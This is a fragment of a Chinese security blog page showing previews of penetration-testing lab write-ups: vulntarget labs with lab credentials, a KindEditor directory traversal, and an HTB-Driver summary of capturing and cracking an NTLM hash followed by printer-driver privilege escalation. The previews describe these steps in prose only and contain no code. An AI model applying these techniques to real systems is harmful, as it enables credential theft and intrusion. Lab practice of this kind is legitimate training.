class="info-2"><div class="info-item-1">vulntarget-j打靶记录：拓朴图如下：   1.第一层：1.1信息收集：使用一系列扫描工具都可以进行初步的发现工作，nmap，tscanplus等，我用后者： 扫出如下端口开放：   有一些指纹信息但我才疏学浅，还需要进一步进行测试！ 指纹识别一手：   打开如下几个端口开放站点：  http://192.168.189.138:80/  80端口是fastadmin的框架   我搜索了这个框架的诸多历史漏洞都没能成功利用，选择对其他开放端口进行进一步的探索。 原因：可能是因为其后台可能已经不是默认路径了，决定尝试从旁站打   http://192.168.189.138:7001/  7001端口对其进行目录扫描工作：      查询状态码是200，301的路径：有如下有信息回显：   发现了：Kindeditor 直接访问默认http:*//192.168.189.138:7001/kindeditor.js*   得知其kindeditor版本：version 3.5.5  存在目录遍历漏洞：KindEditor...</div></div></div></a><a class="pagination-related" href="/posts/98ed62e4.html" title="vulntarget-k靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-19</div><div class="info-item-2">vulntarget-k靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-k打靶记录：正式wp：https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 账号密码信息：    主机 主机账号密码 web账号密码    xxl-job-admin xxl-job&#x2F;root123 admin&#x2F;Bolean@10000   nacos-springcloudgateway spring-nacos&#x2F;root123 nacos&#x2F;bolean@1q2   redis redis&#x2F;redis@1z redis密码：nbsg@123456   拓扑图：   思路：其中外网IP我设置成了：192.168.189.130 网络配置文件为：/etc/netplan/00-installer-config.yaml 123456789101112131415161718network:  ethernets:    ens33:      addresses:      - 192.168.189.130/24      gateway4:...</div></div></div></a><a class="pagination-related" href="/posts/23837ad8.html" title="HTB-Driver"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-22</div><div class="info-item-2">HTB-Driver</div></div><div class="info-2"><div class="info-item-1">HTB-Driver:机器简介：Driver 是一台简单的 Windows 机器，专注于打印机开发。对机器的枚举显示，Web 服务器正在监听端口 80，同时 SMB 正在监听端口 445，WinRM 正在监听端口 5985。导航到该网站显示，它使用基本 HTTP 身份验证受到保护。在尝试常用凭据时，admin:admin 凭据被接受，因此我们能够访问该网页。该网页提供了一项功能，可以将打印机固件上传到 SMB 共享上，以供远程团队进行测试和验证。上传包含从本地机器获取远程文件的命令的 Shell 命令文件会导致用户 tony 的 NTLM 哈希被转发回给我们。破解捕获的哈希以检索纯文本密码，我们能够使用 WinRM 以 tony 身份登录。然后，切换到 meterpreter 会话，发现该机器容易受到本地特权攻击，该攻击会滥用远程机器上存在的特定打印机驱动程序。利用该漏洞，我们可以获得“NT...</div></div></div></a><a class="pagination-related" href="/posts/4f0d5716.html" title="Kerberos-认证原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-24</div><div class="info-item-2">Kerberos-认证原理</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/4a17b156.html" title="vulntarget-i靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-11</div><div class="info-item-2">vulntarget-i靶场</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/mbc.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">icon</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Iconabc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iconabc/" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:2899345299@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">up up</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wuxian%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95%E2%80%94%E6%9C%88%E6%8C%91%E6%88%98"><span class="toc-number">1.</span> <span class="toc-text">wuxian打靶记录—月挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E6%9C%BA%E5%99%A810-10-0-3"><span class="toc-number">1.1.</span> <span class="toc-text">入口机器10.10.0.3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%AF%E6%9C%A8%E6%8A%A5%E8%A1%A8-SSTI%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">积木报表 SSTI：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.2.</span> <span class="toc-text">Shiro 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">1.1.3.</span> <span class="toc-text">Docker容器逃逸</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/55d580db.html" title="wuxiang月挑战one">wuxiang月挑战one</a><time datetime="2024-12-10T02:49:26.000Z" title="发表于 2024-12-10 10:49:26">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/388269d7.html" title="sqlmap常用命令">sqlmap常用命令</a><time datetime="2024-12-10T02:18:56.000Z" title="发表于 2024-12-10 10:18:56">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/efd2e96b.html" title="ffuf使用介绍">ffuf使用介绍</a><time datetime="2024-12-10T01:16:26.000Z" title="发表于 2024-12-10 09:16:26">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/4f0d5716.html" title="Kerberos-认证原理">Kerberos-认证原理</a><time datetime="2024-11-24T15:16:31.000Z" title="发表于 2024-11-24 23:16:31">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/23837ad8.html" title="HTB-Driver">HTB-Driver</a><time datetime="2024-11-22T15:52:37.000Z" title="发表于 2024-11-22 23:52:37">2024-11-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/shuai.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By icon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="/">icon</a> is striving to become stronger!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+
+  const disqusReset = conf => {
+    window.DISQUS && window.DISQUS.reset({
+      reload: true,
+      config: conf
+    })
+  }
+
+  const loadDisqus = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyDisqus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    window.disqus_identifier = isShuoshuo ? path : '/posts/55d580db.html'
+    window.disqus_url = isShuoshuo ? location.origin + path : 'https://iconabc.github.io/posts/55d580db.html'
+
+    const disqus_config = function () {
+      this.page.url = disqus_url
+      this.page.identifier = disqus_identifier
+      this.page.title = 'wuxiang月挑战one'
+    }
+
+    if (window.DISQUS) disqusReset(disqus_config)
+    else {
+      const script = document.createElement('script')
+      script.src = 'https://.disqus.com/embed.js'
+      script.setAttribute('data-timestamp', +new Date())
+      document.head.appendChild(script)
+    }
+
+    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
+  }
+
+  const getCount = async() => {
+    try {
+      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
+      if (!eleGroup) return
+      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')
+
+      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
+        method: 'GET'
+      })
+      const result = await res.json()
+
+      const count = result.response.length ? result.response[0].posts : 0
+      eleGroup.textContent = count
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Disqus' === 'Disqus'
+      ? window.shuoshuoComment = { loadComment: loadDisqus }
+      : window.loadOtherComment = loadDisqus
+    return
+  }
+
+  if ('Disqus' === 'Disqus' || !false) {
+    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+    else {
+      loadDisqus()
+      
+    }
+  } else {
+    window.loadOtherComment = loadDisqus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
